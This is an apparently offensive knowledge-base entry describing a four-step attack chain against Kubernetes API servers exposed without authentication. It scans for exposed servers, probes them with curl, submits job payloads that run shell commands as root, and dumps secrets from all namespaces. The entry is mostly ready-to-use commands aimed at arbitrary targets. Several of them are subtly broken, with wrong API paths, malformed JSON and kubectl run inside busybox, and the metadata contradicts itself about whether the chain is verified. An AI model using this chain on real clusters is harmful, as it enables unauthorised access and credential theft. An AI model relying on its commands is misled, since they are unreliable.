---
tags:
  - kubernetes
  - rce
  - exposed-api
  - credential-theft
  - os-command-injection
type: attack_chain
tools:
  - '[[tools/BinaryEdge-Scanner]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Credential Access]]'
verified: false
platforms:
  - Kubernetes
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Scan-for-Exposed-Kubernetes-APIs]]'
  - '[[procedures/Access-Exposed-Kubernetes-Endpoint]]'
  - '[[procedures/Execute-Arbitrary-Code-as-Cluster-Admin]]'
  - '[[procedures/Extract-Internal-Credentials]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Unix Shell]]'
  - '[[Unsecured Credentials]]'
updated_at: '2025-12-14T17:32:48.640Z'
description: >-
  Multi-stage attack exploiting an exposed Kubernetes API endpoint without
  authorization, enabling arbitrary code execution as cluster-admin and
  subsequent extraction of internal credentials for broader infrastructure
  compromise.
skill_level: intermediate
impact_level: high
id: 3129625d-bdf8-4b39-b5d0-c4947ec0d266
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Unix Shell]]'
  - '[[Unsecured Credentials]]'
---
# Exposed Kubernetes API Leading to Cluster-Admin RCE and Credential Extraction

Multi-stage attack chain demonstrating exploitation of an unauthorized Kubernetes API endpoint, allowing attackers to gain cluster-admin privileges, execute remote code, and extract sensitive internal credentials for further compromise of production infrastructure.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~30 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Reconnaissance: Scan for Exposed APIs] --> B[Initial Access: Unauthorized API Interaction]
    B --> C[Execution: Run Arbitrary Code as Cluster-Admin]
    C --> D[Credential Access: Extract Internal Secrets]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/BinaryEdge-Scanner]]
- curl (for API interaction)
- kubectl (for command execution, if local cluster access simulated)

### Target Environment

- Kubernetes cluster with exposed API server
- Publicly accessible port 6443 (default Kubernetes API port)
- No authentication/authorization on API endpoint

### Initial Access Requirements

- Internet access for scanning
- No prior credentials needed due to exposure
- Basic networking knowledge for API probing

## Detailed Attack Procedures

### Step 1: Reconnaissance - Scan for Exposed Kubernetes APIs
procedure: [[procedures/Scan-for-Exposed-Kubernetes-APIs]]

**Objective**: Identify publicly exposed Kubernetes API endpoints vulnerable to unauthorized access.

**Instructions**: Use [[tools/BinaryEdge-Scanner]] to perform a worldwide scan targeting Kubernetes API servers. Query for open ports and exposed services matching Kubernetes signatures.

For example, search for exposed endpoints:

```bash
# Simulated query in BinaryEdge UI or API: search for 'port:6443 kubernetes'
```

Follow up by verifying the target IP or domain from scan results.

**Expected Output**: List of exposed Kubernetes API URLs, such as https://<target-ip>:6443.

**Success Indicators**:
- Exposed API endpoint identified
- Confirmation of public accessibility without auth

### Step 2: Initial Access - Interact with Exposed API
procedure: [[procedures/Access-Exposed-Kubernetes-Endpoint]]

**Objective**: Gain unauthorized access to the Kubernetes API to enumerate cluster resources and confirm admin privileges.

**Instructions**: Use [[commands/curl-kubernetes-api-probe]] to send a GET request to the /version endpoint or /api endpoint to verify access.

```bash
curl -k https://<target-ip>:6443/version
```

If successful, enumerate namespaces or nodes:

```bash
curl -k https://<target-ip>:6443/api/v1/namespaces
```

**Expected Output**: JSON response with cluster version or namespace list, indicating no auth required.

**Success Indicators**:
- API responds without authentication prompt
- Cluster resources visible

### Step 3: Execution - Run Arbitrary Code as Cluster-Admin
procedure: [[procedures/Execute-Arbitrary-Code-as-Cluster-Admin]]

**Objective**: Exploit the lack of authorization to execute OS commands via Kubernetes jobs or pods, achieving RCE with cluster-admin privileges.

**Instructions**: Leverage the API to create a pod or job that runs a shell command. Use [[commands/kubectl-create-job-rce]] syntax adapted for direct API calls with curl, or if kubectl is configured anonymously:

```bash
curl -k -X POST https://<target-ip>:6443/api/v1/namespaces/default/jobs \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"batch/v1","kind":"Job","metadata":{"name":"exploit-job"},"spec":{"template":{"metadata":{"labels":{"app":"exploit"}},"spec":{"containers":[{"name":"exploit","image":"busybox","command":["sh","-c","whoami > /tmp/output && cat /tmp/output"]}],"restartPolicy":"Never","dnsPolicy":"ClusterFirst","securityContext":{"runAsUser":0},"tolerations":[{"operator":"Exists","effect":"NoExecute"}]}},"backoffLimit":0}'}'
```

Monitor the job status:

```bash
curl -k https://<target-ip>:6443/api/v1/namespaces/default/jobs/exploit-job
```

**Expected Output**: Job created successfully, with logs showing command execution (e.g., root user).

**Success Indicators**:
- Job/pod runs without permission errors
- Arbitrary commands execute as cluster-admin

### Step 4: Credential Access - Extract Internal Secrets
procedure: [[procedures/Extract-Internal-Credentials]]

**Objective**: Use executed code to access and exfiltrate credentials stored in the cluster, enabling access to internal instances.

**Instructions**: From within a privileged pod, access secrets or configmaps containing credentials. Create a job to dump secrets:

```bash
curl -k -X POST https://<target-ip>:6443/api/v1/namespaces/default/jobs \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"batch/v1","kind":"Job","metadata":{"name":"secret-dump"},"spec":{"template":{"metadata":{"labels":{"app":"dump"}},"spec":{"containers":[{"name":"dump","image":"busybox","command":["sh","-c","kubectl get secrets --all-namespaces -o json > /tmp/secrets.json && cat /tmp/secrets.json"]}],"restartPolicy":"Never"}},"backoffLimit":0}'}'
```

Retrieve the output by exec into the pod or logs:

```bash
curl -k https://<target-ip>:6443/api/v1/namespaces/default/pods/secret-dump-xxx/exec?command=cat&command=/tmp/secrets.json
```

**Expected Output**: JSON dump of secrets, including base64-encoded credentials for internal services.

**Success Indicators**:
- Credentials retrieved and decoded
- Valid access to internal instances confirmed

## Attack Chain Summary

### Key Achievements

1. Discovered exposed Kubernetes API via global scanning
2. Achieved unauthenticated cluster-admin access
3. Executed RCE to run arbitrary OS commands
4. Extracted credentials compromising internal infrastructure

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Unix Shell]] Command and Scripting Interpreter: Unix Shell
- [[Unsecured Credentials]] Unsecured Credentials

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution
- [[Credential Access]] Credential Access

---
*Last updated: 2023-10-01T00:00:00Z*
